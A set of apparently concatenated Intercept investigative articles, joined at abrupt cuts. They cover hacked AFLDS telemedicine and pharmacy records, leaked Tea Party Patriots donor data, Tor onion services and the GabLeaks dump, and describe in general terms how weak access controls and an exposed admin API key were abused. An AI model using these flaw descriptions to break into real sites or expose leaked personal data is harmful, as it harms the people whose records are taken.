<p>At least one of the prescribers is aware that medical experts recommend against using these drugs to prevent or treat Covid-19 but prescribed them anyway, according to patient records. One physician included this disclaimer in their consultation notes with several patients: “I, [physician’s name], have a complete understanding of the recent release from the WHO, FDA, CDC, and NIH on March 5th, 2021 as it pertains to the use and prescribing of Hydroxychloroquine and Ivermectin. I understand that these two medications have been deemed ‘Highly Not Recommended’ by the for-mentioned [sic] medical governing bodies but are not illegal to prescribe. &#8230; I have explained that I will not be held legally or medically responsible for an adverse reaction by this patient should they choose to take them and have explained they will not be able to hold me medically neglectful, pursue any form of malpractice, nor any criminal and civilly [sic] suits.”</p>
<p>Beginning last week, the intake form began showing a similar disclaimer to all patients. “As a potential patient, I acknowledge and understand that the Hydroxychloroquine (HCQ) and Ivermectin have been deemed ‘Highly Not Recommended’ by the WHO, FDA, CDC, and NIH,” the disclaimer says. “Should a patient choose to not disclose their proper medical history, the clinician cannot be held liable nor can any medical license in any state be reviewed or held accountable.” Patients must check a box that says “I understand” to continue.</p>
<p>“In facilitating the doctor/patient relationship, our MD&#8217;s are fully licensed and operate within the rules and regulations of the medical profession,” Flinn, the spokesperson for SpeakWithAnMD’s parent company, said. “If a TeleMD in the Speak program decides any FDA medication is appropriate, then the MD can prescribe an FDA-approved medication off-label for any medical condition the TeleMD considers appropriate.”</p>

<h3>“Extremely Pro-Trump” Doctors</h3>
<p>The foundation for America’s Frontline Doctors was laid in a May 11, 2020, <a href="https://apnews.com/article/health-us-news-ap-top-news-politics-virus-outbreak-4ee1a3a8d631b454f645b2a8d9597de7">conference call</a> between a senior staffer in Trump’s reelection campaign and the Republican activist group CNP Action. They reportedly discussed finding “extremely pro-Trump” doctors to go on TV and defend Trump’s plan to rapidly reopen the economy despite the more cautious safety guidance coming from the CDC.</p>
<p>Then, on June 24 of last year, Gold started an Arizona nonprofit called the Free Speech Foundation with a <a href="https://s3.documentcloud.org/documents/21054829/americas-frontline-doctors-1023-tax-exempt-application.pdf">million-dollar annual budget</a> and <a href="https://www.exposedbycmd.org/2021/09/09/tea-party-patriots-are-behind-pro-trump-doctors-grifting-off-of-fake-covid-cures/">fiscal sponsorship</a> from the Tea Party Patriots Foundation. America’s Frontline Doctors, which is a project of this nonprofit, launched on July 27, 2020. Gold, who NPR <a href="https://www.npr.org/sections/health-shots/2021/09/14/1035915598/doctors-covid-misinformation-medical-license">confirmed</a> is a licensed physician in California, along with <a href="https://www.politifact.com/article/2020/jul/29/who-are-doctors-viral-hydroxychloroquine-video/">other doctors </a>in white lab coats, held a press conference on the steps of the Supreme Court building where they falsely claimed that a cocktail of hydroxychloroquine, azithromycin, and zinc could “cure” Covid-19. Another of the group&#8217;s doctors who spoke outside the court was Stella Immanuel, who called the use of masks unnecessary, and quickly earned viral fame when it was revealed that she had previously claimed that the uterine disorder endometriosis is caused by <a href="https://www.youtube.com/watch?v=CJrJG9xymts">sex with demons</a> that takes place in dreams. The event was livestreamed on Breitbart, and videos of it were viewed millions of times on social media after being shared on Twitter by then-President Trump before tech companies <a href="https://www.bloomberg.com/news/articles/2020-07-28/tea-party-group-is-behind-banned-viral-doctors-video">took them down</a> for violating rules against pandemic misinformation. More recently, the group has been <a href="https://americasfrontlinedoctors.org/treatments/ivermectin/">promoting ivermectin</a> as a miracle cure for Covid-19.</p>
<p>“[America’s Frontline Doctors] are really good at manipulating science to seem like the vaccine is not safe, or is not tested, or is not necessary, which is why they&#8217;ve been particularly impactful in the last year plus,” Koltai said.</p>
<p>But it wasn’t until early 2021, when over 345,000 Americans had already died from the pandemic, that America’s Frontline Doctors started to advertise $90 telehealth consultations to receive prescriptions for alternative treatments to Covid-19 on its site.</p>
<p>On January 3, Gold told a packed, maskless church audience in Tampa, Florida, that America’s Frontline Doctors made “hydroxychloroquine available for the entire nation by going to our website.” A video of the lecture, “The Truth About the Covid-19 Vaccine,” has been viewed 1.3 million times on the video-hosting site Rumble after being removed from YouTube. “Then you can consult with a telemedicine doctor. And whether you have Covid, or you don&#8217;t have Covid, or you&#8217;re just worried about getting Covid, you can get yourself a prescription and they mail it to you.” She added, “The big fight wasn&#8217;t the virus, it was the fear.”</p>
<p>Simultaneously, America’s Frontline Doctors began referring its followers for telemedicine appointments. Its website leads prospective customers through a series of preliminary questions before directing them to SpeakWithAnMD.com. “Find out how to obtain prescription medication for COVID-19 with our AFLDS-trained physicians in three easy steps,” it reads, before a prominent “Get Medication” button.</p>

<h3>Cadence Health</h3>
<p>The two months’ worth of patient records that The Intercept has access to show that AFLDS referred over 255,000 people to speak with physicians in order to get Covid-19 treatments. Of those people, 72,000 paid $90 for phone consultations, and many of those had follow-up consultations costing $59.99 each. The hacked data from Cadence Health does not include payment data itself, but doing the math, in just that two-month period, patients appear to have paid more than $6.7 million for phone consultations alone. This data does not include all of the $90 phone consultations from January to July, when SpeakWithAnMD appears to have hosted the intake forms for $90 telemedicine consultations directly, <a href="https://web.archive.org/web/20210415155833/https://speakwithanmd.com/americasfrontlinedoctors/">according</a> to archived <a href="https://web.archive.org/web/20210301200931/https://speakwithanmd.com/intake/americasfrontlinedoctors/telemedicine_add_patient_wizard.php">versions</a> of the site. The telemedicine site appears to be billing patients directly and not their insurance companies.</p>
<p>Espinal claims that Cadence Health didn’t collect credit card payments and that the $90 charges for telehealth were made using SpeakWithAnMD’s payment processor. Espinal told The Intercept he charged SpeakWithAnMD a total of $17,500 for using its platform and that SpeakWithAnMD was his first and only customer.</p>
<p>After The Intercept reached out to the companies for comment on Monday, SpeakWithAnMD’s parent company, Encore Telemedicine, had an emergency meeting with lawyers from AFLDS, according to Espinal, who briefly attended the meeting via Zoom. “There were 16 different attorneys,” he told The Intercept, though Gold was not present. According to Espinal, he told the lawyers, “I’m ending my contract with you guys immediately,” and then left. Afterward, he took down Cadence Health’s service, preventing SpeakWithAnMD from operating.</p>
<p>The hacked data from Cadence Health gives insight into the patients themselves. Of those 72,000 patients in that two-month period, 58 percent were female, 38 percent were male, and 4 percent chose not to answer the question. While people of all ages sought consultations with AFLDS’s health care providers, people in their 50s and 60s were more likely to engage than other age groups. According to <a href="https://www.cdc.gov/coronavirus/2019-ncov/covid-data/investigations-discovery/hospitalization-death-by-age.html">data</a> provided by the CDC, Covid-19 patients aged 50 to 64 are four times more likely to be hospitalized and 30 times more likely to die than people aged 18 to 29. Covid-19 patients aged 65 to 74 are five times more likely to be hospitalized and 90 times more likely to die.</p>
<p>People in every state in the country, as well as Washington, D.C., sought the unproven Covid-19 treatments. 8,600 people in California paid $90 for telehealth consultations, as did another 8,000 in Florida and 7,400 in Texas. More than 1,000 people in each of an additional 21 states consulted health care providers through the service. The only states that contained less than 100 patients were Delaware and Vermont. Houston, Las Vegas, Phoenix, and Jacksonville all had over 300 patients.</p>

<!-- END-BLOCK(iframe)[15] -->This map, based on the hacked data, shows how many people sought unproven Covid-19 treatments from each city, for cities that have at least 10 users. Each dot is mapped to the geographic center of the city. No individual home addresses are represented in the map.</p>
<h3>Ravkoo</h3>
<p>Ravkoo filled its first prescription from AFLDS just 10 days after Gold’s “The Truth About the Covid-19 Vaccine” speech, on January 13, for hydroxychloroquine. In the data for the prescription, “AMERICAS FRONT LINE DOCTORS &#8211; ENCORE” is listed under the “remarks” field.</p>
<p>In the hacked data, each of the 340,000 prescriptions filled by Ravkoo between November 3, 2020, and September 11, 2021, lists a price. Adding up the prices of each type of medication shows that the online pharmacy apparently charged people a total of $4.7 million for ivermectin, $2.4 million for azithromycin, $1.2 million for hydroxychloroquine, $175,000 for zinc, and $52,000 for vitamin C. It appears that the vast majority of these medicines were paid for out-of-pocket rather than through insurance. Only $500 of these medicine sales were paid by insurance providers. Patel told The Intercept that Ravkoo doesn’t take a cut of prescription sales and that they run a platform that delivers prescriptions to local pharmacies — “Just like Uber,” he said — but didn’t answer follow-up questions about Ravkoo’s business model.</p>
<p>The Better Business Bureau <a href="https://www.bbb.org/us/fl/auburndale/profile/pharmacy/ravkoo-inc-0733-90758489#bbbseal">warns</a> that there are “current alerts” for Ravkoo, where the pharmacy has one out of five stars. Customers describe the pharmacy ignoring calls and emails about prescriptions for Covid-19 medicine from AFLDS.</p>
<p>On September 2, the pharmacy responded to complaints to the Better Business Bureau, saying, “We are no longer affiliated with AFLD [sic] or speakwithanmd.com. We are working diligently to resolve this issue.” Yet the hacked data includes 268 prescriptions that mention AFLDS between September 2 and September 11, the date Ravkoo was hacked.</p>

<p>When asked why the vast majority of prescriptions filled by Ravkoo appear to be for unproven Covid-19 treatments, Patel explained, “We don’t control who sends us business. Let’s put it that way. We don’t have formal contracts with particular companies. Patients can send us business.” Ravkoo could “find pharmacies for our patients who can pull ivermectin and get them at a lower cost. So patients are talking to each other, and that’s how that business might have — how America’s Frontline might have got to know us and started sending us business.”</p>
<p>Patel also claimed that he “got a threatening letter from one of the doctors saying, ‘Hey, if you don’t fill that prescription I’m gonna sue you.’ So pharmacists are put in a really tough position here.”</p>
<h3>“Hilariously Easy” to Hack</h3>
<p>“The whole online and telemedicine space is a bit of a Wild West because of the way the pandemic forced everyone to deal with telehealth right away,” Lee Tien, a senior staff attorney at the Electronic Frontier Foundation, told The Intercept.</p>
<p>The websites involved in this telemedicine operation were all built during the pandemic to take advantage of this Wild West. <a href="https://certificate.transparency.dev/">Certificate transparency</a> records, which list which SSL certificates are created and when, show that the domain speakwithanmd.com was first set up in March last year, ravkoo.com was first set up in September last year, and cadencehealth.us was first set up in February of this year.</p>
<p>While the pandemic popularized telehealth, “patients still had to go to the pharmacy to pick up the prescription, and that’s where we came up with the idea to make a prescription delivery platform offering free nationwide same-day delivery,” Patel <a href="https://ravkoo.com/news/alpesh-patel-ceo-of-ravkoo-shares-about-his-journey-of-creating-a-successful-healthcare-company/">said</a> while describing his motivation for starting the company.</p>
<p>The hacker told The Intercept that Cadence Health and Ravkoo were “hilariously easy” to hack. The websites of both companies had broken access controls, one of the <a href="https://owasp.org/www-project-top-ten/">most common mistakes</a> in web application security.</p>
<p>The Cadence Health website only validated user input on the client side, not the server side, according to the hacker. This means that when a user accesses the telemedicine site the normal way, by loading the site in their browser, they can only access their own data, but if they write a program that tries to access other data on the server, the server will respond with that data. The hacker simply asked the server for all patient data.</p>
<p>Cadence Health’s website <a href="https://cadencehealth.us/platform/">describes itself</a> as the “most secure PCI &amp; HIPAA-compliant VirtualCare Platform.” “Our website is still in development,” Espinal told The Intercept. “We don’t even have content. This was not supposed to be live.”</p>
<p>The Ravkoo website had a “hidden admin panel that every user can log in to and view all the data,” according to the hacker. Using this admin panel, the hacker was able to exfiltrate all of the online pharmacy’s prescription data. The vulnerability in Ravkoo’s website also appears to be fixed, according to the hacker, who reached back out to The Intercept after checking.</p>
<p>“It’s quite possible that [the companies] violated HIPAA by having such weak security,” Tien said. The Health Insurance Portability and Accountability Act is a federal law that requires health care providers to protect sensitive “patient health information” from being disclosed without the patient’s consent or knowledge. The current <a href="https://www.hhs.gov/hipaa/for-professionals/security/laws-regulations/index.html">security rule</a> defined by HIPAA requires providers to “implement technical policies and procedures that allow only authorized persons to access electronic protected health information.”</p>
<p>HIPAA also defines a <a href="https://www.hhs.gov/hipaa/for-professionals/breach-notification/index.html">breach notification rule</a> that requires health care providers to “notify affected individuals following the discovery of a breach” within two months of discovering the breach. Providers must individually notify affected patients by first-class mail or email, and if they have outdated contact information for enough patients, they’re required to post a public notice on their website or “in major print or broadcast media where the affected individuals likely reside.” If the breach affected more than 500 people, like the Cadence Health and Ravkoo breaches do, they are also required to “provide notice to prominent media outlets” serving the jurisdiction where the patients live.</p>
<p>While HIPAA rules have been loosened during the pandemic to accommodate telemedicine, health care providers are still required to protect sensitive patient health information that they collect.</p>
<p>The companies were left pointing fingers at each other. Espinal, Cadence Health’s CEO, told The Intercept that the patient database is hosted in Encore Telemedicine’s Amazon Web Services account and that his company does not have access to this data. Flinn, the public relations agent working for Encore, insists that the database is in Cadence’s AWS account, not in Encore’s.</p>
<p>“Following the money is a really important thing,” Koltai, of Center for an Informed Public, said.</p>

                                        <content:encoded><![CDATA[<p><u>Tea Party Patriots,</u> a major conservative organization that bills itself as one of the largest grassroots groups on the right, was in fact heavily backed by three ultra-wealthy individuals in recent years, according to internal data reviewed by The Intercept.</p>
<p>The largest donor was Texas billionaire Christopher Goldsbury, who made his fortune selling the salsa company Pace Foods to Campbell Soup in 1994. On September 11, 2019, Goldsbury donated $1 million to the TPP Foundation via wire transfer. According to tax documents, the TPP Foundation took in $1.2 million in revenue that year. Goldsbury had been a TPP member since 2014 and had already donated $20,000 to TPP’s three separate organizations in previous years. Goldsbury did not respond to a request for comment.</p>
<p>Meanwhile, activity by the group’s members appears to have waned. The Intercept found just 144,000 members marked “active” in the online data, versus claims on the TPP website of a “<a href="https://www.teapartypatriots.org/press-release/tea-party-patriots-citizens-fund-applauds-pres-trump-for-nominating-mike-pompeo-to-be-secretary-of-state/">network of 3 million activists</a>,” of “<a href="https://www.teapartypatriots.org/citizensfund-news/tea-party-patriots-citizens-fund-commends-senate-for-passing-tax-reform-bill/">more than 3 million supporters</a>,” and of “over 3 million patriots.” Data from local chapters show members are clustered in fast-growing areas like Colorado and all along the Sun Belt, from California through Arizona, Texas, Georgia, and Florida.</p>
<!-- BLOCK(newsletter)[0](%7B%22componentName%22%3A%22NEWSLETTER%22%2C%22entityType%22%3A%22SHORTCODE%22%2C%22optional%22%3Atrue%7D)(%7B%7D) --><div class="shortcode" data-shortcode="newsletter" data-campaign="" data-cta="" data-headline="" data-layout="" data-subhead=""></div><!-- END-BLOCK(newsletter)[0] -->
<p>The 327 gigabytes of TPP data were provided to The Intercept anonymously by a source who claimed to have hacked the group’s web back end. In January, The Intercept<a href="https://27m3p2uv7igmj6kvd4ql3cct5h3sdwrsajovkkndeufumzyfhlfev4qd.onion/2021/01/13/capitol-riot-donors-tea-party-patriots/"> obtained</a> documents that exposed the identity of a handful of wealthy TPP donors, but the new data fleshes out the understanding of the group’s big-money backing.</p>
<p>The data includes a trove of information about people who are members of Tea Party Patriots local chapters, have signed petitions, or have donated: their names, phone numbers, home addresses, and a detailed activity history for each user. The Intercept is not naming or otherwise exposing information on individual members of the organization other than the group’s three biggest donors (at least two of whom were reported billionaires).</p>
<!-- BLOCK(cta)[1](%7B%22componentName%22%3A%22CTA%22%2C%22entityType%22%3A%22SHORTCODE%22%2C%22optional%22%3Atrue%7D)(%7B%7D) --><!-- END-BLOCK(cta)[1] -->
<p>Because the data obtained by the hacker comes only from the group’s web infrastructure, there could be important records missing. For example, there might be TPP supporters who signed up at a live event or made in-person donations but are not tracked by the web database. Some of the data provided by the hacker was corroborated with publicly available information, including some donations and TPP petitions. Still, it’s impossible to authenticate all of the data, and after The Intercept obtained the data a hacker altered pages on TPP’s website.</p>
<p>TPP did not answer specific questions about the breach but instead<a href="https://web.archive.org/web/20210803011044/http:/lnk.teapartypatriots.org/m/1/49109489/02-b21214-1400260ffb224814a990d9962d6393dc/339/415/1e0cad08-1243-41ea-9a34-e11b5a365f61"> provided The Intercept an email</a> sent to members from co-founder Jenny Beth Martin, notifying them of the hack and adding that the group had contacted law enforcement and worked “to ensure that our systems are not compromised and are secured even further to ensure that an event of this type does not happen again.” The email continued, “And you can be certain that we will take every step possible to find and help prosecute these criminals who have broken into our electronic home and stolen proprietary and confidential information.”</p>

<h3>“Over 3 Million Patriots”</h3>
<p>TPP was founded in 2009, shortly after the inauguration of President Barack Obama. The group, <a href="https://washingtonmonthly.com/2021/02/19/the-tea-party-began-12-years-ago-whats-changed-and-what-hasnt/">according</a> to<a href="https://www.npr.org/sections/itsallpolitics/2010/09/20/129993339/obama-tells-rick-santelli-he-feels-his-pain"> numerous</a> accounts, was<a href="https://www.thedailybeast.com/when-cnbc-created-the-tea-party"> inspired</a> by an on-air rant by CNBC editor Rick Santelli against an Obama administration<a href="https://www.treasury.gov/press-center/press-releases/pages/20092181117388144.aspx"> proposal</a> to help homeowners avoid foreclosure in the early days of the financial crisis. TPP spent its first years organizing against the Affordable Care Act and government spending in general; today, reining in federal expenditures remains central to the group’s<a href="https://www.teapartypatriots.org/about/"> stated priorities</a>. But<a href="https://newrepublic.com/article/84642/no-the-tea-party-isnt-racist-yes-it-racial"> racial</a> and<a href="https://www.motherjones.com/politics/2019/09/the-tea-party-got-what-it-wanted/"> anti-immigrant</a> animus has<a href="https://www.vox.com/2016/7/7/12118872/southern-racism-tea-party-trump"> regularly appeared</a> within the<a href="https://www.gsb.stanford.edu/insights/how-racial-threat-has-galvanized-tea-party"> group</a>, which was also<a href="https://www.motherjones.com/politics/2021/04/how-a-feud-between-2-tea-party-leaders-helped-lay-the-groundwork-for-the-capitol-insurrection/"> involved</a> in organizing the “March to Save America” rally culminating in the deadly January 6, 2021, storming of the U.S. Capitol, aimed at preventing Congress from certifying Joe Biden’s electoral victory. (TPP has said it did not fund the rally and <a href="https://27m3p2uv7igmj6kvd4ql3cct5h3sdwrsajovkkndeufumzyfhlfev4qd.onion/2021/01/13/capitol-riot-donors-tea-party-patriots/">stated</a> it was “shocked, outraged, and saddened at the turn of events on January 6,” condemning the violence.)</p>

<p>Records from the hacked database shed light on its major backers. Now-deceased California real estate mogul Sanford Diller was another billionaire who provided major funding to TPP. According to tax documents, the TPP Foundation took in $106,318 in revenue in 2015. And according to the hacked data, they only took in two donations that year, and one of them was a $100,000 check from Diller. Diller donated another $100,000 in 2016, and $50,000 more in 2017, to the foundation. In 2016 he also donated $150,000 to TPP’s super PAC. The Intercept <a href="https://27m3p2uv7igmj6kvd4ql3cct5h3sdwrsajovkkndeufumzyfhlfev4qd.onion/2021/01/13/capitol-riot-donors-tea-party-patriots/">reported</a> on some of Diller’s foundation donations earlier this year, and late last year ABC News said Justice Department documents implicated Diller in a<a href="https://abcnews.go.com/Politics/billionaire-pardon-effort-pledged-massive-donation-trump-sources/story?id=74656249"> secret lobbying scheme</a> to trade political donations to entities associated with former President Donald Trump for a pardon.</p>
<p>Another major funder of TPP is David Gore, an<a href="https://www.oregonlive.com/politics/2020/02/oregon-man-emerges-as-tea-partys-newest-big-donor.html"> Oregon libertarian</a> whose family owns the Gore-Tex fabric company. Between 2018 and January 2021 he donated $50,000 to TPP Action, $275,000 to TPP’s super PAC, and $124,000 to TPP Foundation, according to the internal data obtained by The Intercept. Gore could not be reached for comment.</p>
<p>Tea Party Patriots has three separate organizations: a 501(c)(3) public charity called TPP Foundation; a 501(c)(4) social welfare organization, which is allowed to engage in more extensive lobbying than a 501(c)(3), called TPP Action; and a super political action committee, which can spend unlimited amounts of dark money to support political candidates, called TPP Citizens Fund.</p>
<p>The hacked data includes information about individual donations to these three organizations, but it doesn’t include money raised from interest groups and corporations. For example, TPP’s super PAC raised a total of $2.9 million to support Trump’s 2020 election campaign, but individual donor records from the hacked data only add up to $460,000 that election cycle.</p>
<p>The hacked records also indicate that while TPP has cultivated the image of a mass movement, less than half a million people have either joined a local chapter or even just signed an online petition starting in 2013 or earlier. Of those members, roughly a third are marked “active.”</p>
<p>The data describes roughly 800 local chapters, including a list of members for each chapter. Local TPP chapters have a total of 15,000 users who are marked active, meaning that only about 10 percent of active users in TPP’s database are members of a local chapter — everyone else are people who have signed petitions, donated, or subscribed to mailing lists.</p>

<p>The chapters with the most users are in Arapahoe County, Colorado, and Atlanta, Georgia, as well as a geographically dispersed chapter called United and Standing, which have between 130 and 190 members each. Groups have 20 members on average, though some have not been active for many years. Of the 144,000 active users, nearly 1,000 of them live in Houston, Texas, the largest city concentration, and hundreds more in San Antonio, Dallas, and Fort Worth. Other top hubs of active users include Las Vegas, Nevada; Phoenix and Tucson, Arizona; Jacksonville and Tampa, Florida; San Diego, California; Colorado Springs and Denver, Colorado; among others.</p>
<p>There are 148 petitions in the database, with dates from 2014 to 2021, and information about everyone who signed a petition and whether they also sent a message to Congress or donated.</p>
<p>The most recent petition, entitled “Stop Critical Race Theory,” had only garnered 34 signatures in the two weeks between June 23, when it was created, and July 7, when the site was hacked. Over 70,000 people signed the most popular petition on the site, entitled “Make Adam Schiff Resign,” during Trump’s first impeachment inquiry; Schiff, a California Democrat and chair of the House Intelligence Committee, was a lead investigator into allegations that Trump withheld funds from Ukraine in exchange for investigations into the Bidens.</p>

<p>From mid-2015 through mid-2017, TPP routinely had petitions reach over 20,000 signatures with names like “No Funding for Illegals,” “Save Our Constitution,” “Support Senator Jeff Sessions,” and “Trump Won, Get Over It,” but the number of signatures on their petitions has significantly dwindled in recent years.</p>
<p>In 2018, a petition to confirm Brett Kavanaugh to the Supreme Court got 16,000 signatures. Since then, only two petitions have breached 8,000 signatures, and they were both during Trump’s first impeachment inquiry: the aforementioned Schiff petition and another, addressed to the Office of Congressional Ethics demanding they conduct an ethics inquiry into House Speaker Nancy Pelosi, which received 14,000 signatures.</p>
<p>Also exposed in the TPP breach were password hashes, or encrypted representations of passwords that members use to login to the teapartypatriots.org website, for over 13,000 users. The password hashes appear to use an algorithm called “salted MD5.” MD5 is a hash function that was<a href="https://www.kb.cert.org/vuls/id/836068"> proven</a> to be insecure in 2010. Anyone with this hacked data could likely recover most of the original passwords using off-the-shelf hardware.</p>
<h3>A Trivial Vulnerability</h3>
<p>The hacker who obtained all this data told The Intercept they were motivated by the Tea Party Patriots’ role in<a href="https://www.bloomberg.com/news/articles/2020-07-28/tea-party-group-is-behind-banned-viral-doctors-video"> helping</a> advocate<a href="https://www.nbcnews.com/tech/social-media/dark-money-pac-s-coordinated-reopen-push-are-behind-doctors-n1235100"> for</a> the use of hydroxychloroquine as a treatment for Covid-19. The vast bulk of<a href="https://www.nytimes.com/article/hydroxychloroquine-coronavirus.html"> evidence</a> indicates the anti-malaria drug, pushed by former President Donald Trump, does not work for that use. A video advocating for hydroxychloroquine, featuring a group called America’s Frontline Doctors, was reportedly funded by and promoted at an event organized by TPP. The video was later blocked by Facebook, YouTube, and Twitter for containing false statements or otherwise violating their standards.</p>
<p>“Since [Tea Party Patriots] were responsible for a large part of the misinformation in the early stages of the COVID-19 pandemic by promoting hydroxychloroquine with the America Frontline Doctors stunt, I&#8217;m sharing the data in hopes that it can shed some light on the people involved and where their funding comes from,” the hacker told The Intercept in an encrypted text message. “I read some articles about the America’s Frontline Doctors stunt, took a look at their website, and one thing led to another.”</p>
<p>The identity of the hacker is not known to The Intercept. They said they identified with the decentralized hacktivist collective Anonymous. Law enforcement in Georgia is now investigating the cyber break-in, and a detective at the Cherokee County Sheriff’s Office contacted The Intercept about the case.</p>
<p>The person said they discovered a trivial, but fatal, security flaw in the database that powered teapartypatriots.org. Examining one of the group’s petitions, “Wear Red on Trump’s Birthday” in which people could pledge to wear red on June 14 to support Trump, they discovered the page’s source code contained an administrator API key — essentially, a secret password that grants access to TPP’s database.</p>

<p>It’s common for web applications like this one to use an API, or application programming interface, and to embed API keys in the code of web pages, allowing the browser to access the data that it needs. However, API keys are supposed to have limited permissions: For example, an API key on a petition page should only have permission to access data related to the petition.</p>
<p>But the API key that TPP included was not limited <i>at all</i>. It had administrator access. It allowed anyone who had it (by viewing the source of the web page, for example) to access <i>all</i> the information in TPP’s massive database. The Intercept confirmed that this administrator API key was not only on the “Wear Red on Trump’s Birthday” petition, but also on all other petitions as well.</p>

<p>Armed with the API key, the hacker was then able to load addresses at api.teapartypatriots.org over 800,000 times, exfiltrating hundreds of gigabytes of data from the conservative activist group’s database.</p>
<p>With an administrator API key, hackers not only are able to <i>access</i> information from the database, but they can also <i>change</i> that information. This appears to have happened with TPP’s web pages: For a few weeks in July, after The Intercept obtained the hacked database, all the featured petitions on TPP’s website had been renamed to “Stop Computer Fraud and Abuse Act.”</p>

<p>Websites that end in “.onion” are known as Tor onion services — or if you want to be dramatic about it, the “dark web.” Here’s how it all works.</p>
<h3>Tor Browser Lets People Browse the Web Anonymously</h3>
<p>When you load a website in a normal web browser like Chrome, Firefox, Safari, or Edge, you make a connection over the internet directly from your house (or wherever you happen to be) to the web server you’re loading. The website can see where you are coming from (and track you), and your internet service provider can see which website you’re loading (and track what you’re doing and <a href="https://www.wsj.com/articles/t-mobile-to-step-up-ad-targeting-of-cellphone-customers-11615285803">sell advertising</a> based on <a href="https://www.lightreading.com/security/t-mobile-to-join-atandt-verizon-in-selling-customers-data/d/d-id/767955">your activity</a>).</p>
<p>But if you open Tor Browser and load the same website, none of those parties can spy on you. Even Tor itself won’t know what you’re up to. Within the network, consisting of thousands of nodes run by volunteers across the internet, you do not connect from your house directly to the web server. Instead, your connection first bounces between three Tor nodes and then finally exits the Tor network and goes to the website. The website can’t see where you’re coming from, only that you’re using Tor. Your ISP can’t see what website you’re visiting, only that you’re using Tor. And the Tor nodes themselves can’t fully track you either. The first node can see your home IP address, because you connect directly to it, but can’t see what site you’re loading, and the last node (also called the exit node) can see what site you’re loading but doesn’t know your IP address.</p>
<p>In short, Tor Browser makes it so <i>people</i> can load websites anonymously. Tor onion services do the same thing, except for <i>websites themselves</i>.</p>
<h3>Tor Onion Services Let Websites Themselves Be Anonymous</h3>
<p>So what exactly is an onion service? Just like when people use Tor Browser to be anonymous, web servers can use Tor to host anonymous websites as well. Instead of using normal domain names, these websites end with “.onion”.</p>
<p>If you load an onion site in Tor Browser, both you and the web server bounce encrypted data packets through the Tor network until you complete an anonymous connection, and no one can track anyone involved: Your ISP can only see that you’re using Tor, and the <i>website’s ISP</i> can only see that<i> it’s</i> using Tor. You can’t learn the website’s real IP address, and the website can’t learn yours either. And the Tor nodes themselves can’t spy on anything. All they can see is that two IP addresses are both using Tor.</p>
<p>Onion services have another cool property: The connection never exits the Tor network, so there are no exit nodes involved. All the communication between Tor Browser and the web server happens in the dark.</p>
<h3>The Most Popular Site on the Dark Web</h3>
<p>When people hear about the “dark web,” they tend to think about shady things like drug markets and money laundering. That stuff is, in fact, facilitated by anonymous websites running Tor onion services, just as it’s facilitated by the normal, non-anonymous internet. But it’s not the only use of onion services by a long shot.</p>
<p>The Intercept along with <a href="https://securedrop.org/directory/">dozens of other newsrooms</a> around the world, including pretty much every major news organization, run Tor onion sites for SecureDrop, a whistleblower submission platform. With The Intercept’s new onion service for readers of our website, we’ll also join the ranks of the New York Times, ProPublica, BuzzFeed News, The Markup, and <a href="https://securethe.news/sites/">other news organizations</a> in making their core websites available as onion services.</p>
<p>I also develop an open source tool called <a href="https://onionshare.org/">OnionShare</a> which makes it simple for anyone to use onion services to share files, set up an anonymous drop box, host a simple website, or launch a temporary chat room.</p>
<p>But, by far, the most popular website on the dark web is Facebook. Yup, <a href="https://en.wikipedia.org/wiki/Facebookcorewwwi.onion">Facebook has an onion service</a>. For when you want some — but not too much — anonymity.</p>

                                        <content:encoded><![CDATA[<p><u>In late February</u>, somebody <a href="https://arstechnica.com/gadgets/2021/03/rookie-coding-mistake-prior-to-gab-hack-came-from-sites-cto/">hacked</a> Gab, an online safe space for white supremacists and other extremists. The hacker, who self-identifies as “JaXpArO and My Little Anonymous Revival Project,” exfiltrated roughly 65 gigabytes of data, including 4 million Gab accounts, 31,000 groups, and 39 million posts (over 100,000 of which were posted to private groups).</p>
<p>The hacker then leaked this data, which spans the site’s launch in August 2016 until February 19, to the transparency collective Distributed Denial of Secrets. In a Gab post, the hate site’s CEO Andrew Torba <a href="https://ddosecrets.com/wiki/GabLeaks#False_Accusations_by_Gab">falsely accused</a> DDoSecrets of hacking Gab, using an anti-trans slur while he was at it.</p>
<!-- BLOCK(photo)[0](%7B%22componentName%22%3A%22PHOTO%22%2C%22entityType%22%3A%22RESOURCE%22%7D)(%7B%22scroll%22%3Afalse%2C%22align%22%3A%22center%22%2C%22width%22%3A%221000px%22%7D) --><div class="img-wrap align-center  width-fixed" style="width: 1000px;"><!-- CONTENT(photo)[0] -->

<p>Due to privacy concerns, DDoSecrets is only offering <a href="https://ddosecrets.com/wiki/GabLeaks">GabLeaks</a> to journalists and researchers who request access rather than publishing the full leak on the internet. (For the record, I’m a member of the DDoSecrets advisory board.)</p>
<p>For everyone else, here’s a broad overview of the GabLeaks data. Some of it is fairly technical, so bear with me. I’ll try to explain what I mean when I use unfamiliar terms.</p>
<h3>Database Dumps and Chat Logs</h3>
<p>JaXpArO provided DDoSecrets with data exported from a PostgreSQL database containing accounts, groups, and posts as well as a text file containing thousands of chat messages.</p>
<!-- BLOCK(newsletter)[1](%7B%22componentName%22%3A%22NEWSLETTER%22%2C%22entityType%22%3A%22SHORTCODE%22%2C%22optional%22%3Atrue%7D)(%7B%7D) --><div class="shortcode" data-shortcode="newsletter" data-campaign="" data-cta="" data-headline="" data-layout="" data-subhead=""></div><!-- END-BLOCK(newsletter)[1] -->
<p>Out of the over 4 million accounts, 38,175 include email addresses (though not all of them appear to be valid email addresses) and 7,110 include password hashes, which are basically scrambled representations of passwords, from which in some cases the original password can be recovered (more on this below).</p>
<p>For example, here is the data associated with <a href="https://www.vanityfair.com/news/2021/02/marjorie-taylor-greene-fake-mea-culpa">QAnon-believing</a>, <a href="https://www.cnn.com/2021/01/27/politics/marjorie-taylor-greene-david-hogg-video/index.html">school-shooting-survivor-harassing</a> Rep. Marjorie Taylor Greene’s Gab account:</p>
<!-- BLOCK(photo)[2](%7B%22componentName%22%3A%22PHOTO%22%2C%22entityType%22%3A%22RESOURCE%22%7D)(%7B%22scroll%22%3Afalse%2C%22align%22%3A%22center%22%2C%22width%22%3A%221000px%22%7D) --><div class="img-wrap align-center  width-fixed" style="width: 1000px;"><!-- CONTENT(photo)[2] -->

<p>Her account was created with the email address press@greene2020.com on January 11, and at the time Gab was hacked in late February, she had 217,544 followers, a verified account, and had 72 posts. It also includes her password hash but not the password itself.</p>
